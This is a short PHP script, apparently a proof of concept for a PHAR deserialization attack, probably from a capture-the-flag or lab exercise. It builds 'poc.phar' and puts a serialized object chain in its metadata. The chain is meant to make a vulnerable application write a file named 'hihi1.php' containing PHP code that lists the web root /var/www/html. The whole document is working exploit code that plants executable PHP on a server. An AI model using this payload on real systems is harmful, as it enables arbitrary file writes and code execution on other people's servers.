<?php
class image {
        public function __construct(){
                $this->file = 'hihi1.php';
                $this->data = '<?php $dir = "/var/www/html"; $files1 = scandir($dir); print_r($files1); ?>';
        }
}

class controller_audio {
        public $default_audio = [];
        public function __construct(){
                $this->default_audio = new image();
        }
}

$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->setMetadata(new controller_audio());
$phar->stopBuffering();
?>